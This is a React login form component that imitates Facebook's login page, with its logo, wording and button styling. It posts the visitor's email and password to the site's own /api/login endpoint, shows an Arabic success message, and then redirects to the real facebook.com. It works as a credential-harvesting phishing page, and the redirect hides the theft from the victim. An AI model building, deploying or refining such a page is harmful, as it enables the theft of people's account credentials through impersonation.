"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"

export function LoginForm() {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [message, setMessage] = useState("")

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setMessage("")

    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })

      const data = await response.json()

      if (response.ok) {
        setMessage("تم تسجيل الدخول بنجاح!")
        setEmail("")
        setPassword("")
        setTimeout(() => {
          window.location.href = "https://www.facebook.com"
        }, 1500)
      } else {
        setMessage(data.error || "حدث خطأ")
      }
    } catch (error) {
      setMessage("خطأ في الاتصال بالخادم")
      console.error("Login error:", error)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="w-full max-w-sm bg-white rounded-lg shadow-lg p-8 md:p-10">
      <div className="flex justify-center mb-6">
        <svg className="w-12 h-12 text-blue-600" fill="currentColor" viewBox="0 0 24 24">
          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
        </svg>
      </div>

      <form onSubmit={handleLogin} className="space-y-4">
        {/* Email Input */}
        <input
          type="email"
          placeholder="Email or phone number"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="w-full px-4 py-3 bg-gray-100 text-gray-900 placeholder-gray-500 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition"
          required
          disabled={isLoading}
        />

        {/* Password Input */}
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="w-full px-4 py-3 bg-gray-100 text-gray-900 placeholder-gray-500 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition"
          required
          disabled={isLoading}
        />

        {message && (
          <div
            className={`p-3 rounded text-sm text-center ${
              message.includes("نجاح") ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700"
            }`}
          >
            {message}
          </div>
        )}

        {/* Login Button */}
        <Button
          type="submit"
          disabled={isLoading}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded text-lg transition disabled:opacity-50"
        >
          {isLoading ? "جاري التحميل..." : "Log In"}
        </Button>
      </form>

      {/* Divider */}
      <div className="flex items-center gap-3 my-6">
        <div className="flex-1 h-px bg-gray-300"></div>
        <span className="text-gray-600 text-sm">or</span>
        <div className="flex-1 h-px bg-gray-300"></div>
      </div>

      {/* Forgot Password Link */}
      <div className="text-center mb-8">
        <a href="#" className="text-blue-600 hover:text-blue-700 text-sm font-medium">
          Forgotten password?
        </a>
      </div>

      {/* Create Account Button */}
      <Button className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 rounded text-base transition">
        Create new account
      </Button>
    </div>
  )
}
